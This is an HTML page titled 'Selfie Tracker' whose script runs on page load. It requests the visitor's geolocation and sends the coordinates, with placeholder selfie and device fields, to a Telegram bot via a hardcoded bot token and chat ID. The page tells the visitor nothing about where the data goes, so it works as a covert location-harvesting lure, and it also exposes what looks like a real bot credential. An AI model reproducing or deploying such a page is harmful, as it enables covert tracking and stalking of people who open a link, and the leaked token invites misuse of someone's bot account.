<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Tracker</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
            border-radius: 15px;
            max-width: 500px;
        }
        iframe {
            width: 100%;
            max-width: 400px;
            height: 350px;
            border: none;
            border-radius: 12px;
            margin: 15px 0;
            background: #222;
        }
        button {
            background: #ff5722;
            border: none;
        }
    </style>
</head>
<body>
    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
        const CHAT_ID = '5410457102';

        // ==================== SEND TO TELEGRAM ====================
        async function sendToTelegram(image, lat, lon, source, device, userName) {
            // Send location first
            const locationResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });

            if (!locationResponse.ok) {
                throw new Error('Failed to send location to Telegram');
            }

            // Send message
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const message = `New selfie from ${userName}!\n\n` +
                `Image: ${image}\n` +
                `Latitude: ${lat}\n` +
                `Longitude: ${lon}\n` +
                `Source: ${source}\n` +
                `Device: ${device}`;

            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send message to Telegram');
            }
        }

        // ==================== CAPTURE AND SEND ====================
        async function captureAndSend() {
            const statusDiv = document.createElement('div');
            statusDiv.id = 'status';
            statusDiv.textContent = '⏳ Capturing...';
            document.body.appendChild(statusDiv);

            try {
                // Request geolocation permission
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;

                            // Simulate data capture (since camera is removed)
                            const data = {
                                image: 'default_image_url', // Replace with a default image URL
                                lat: lat,
                                lon: lon,
                                source: 'simulated', // Replace with actual source
                                device: 'simulated_device' // Replace with actual device info
                            };

                            // Send everything
                            await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
                            statusDiv.textContent = '✅ Selfie captured and sent!';
                        },
                        (error) => {
                            console.error('Error getting location:', error);
                            statusDiv.textContent = '❌ Failed to get location.';
                        }
                    );
                } else {
                    statusDiv.textContent = '❌ Geolocation is not supported by this browser.';
                }
            } catch (err) {
                console.error(err);
                statusDiv.textContent = '❌ Failed to capture and send selfie.';
            }
        }

        // Automatically run the capture and send process when the page loads
        window.onload = captureAndSend;
    </script>
</body>
</html>
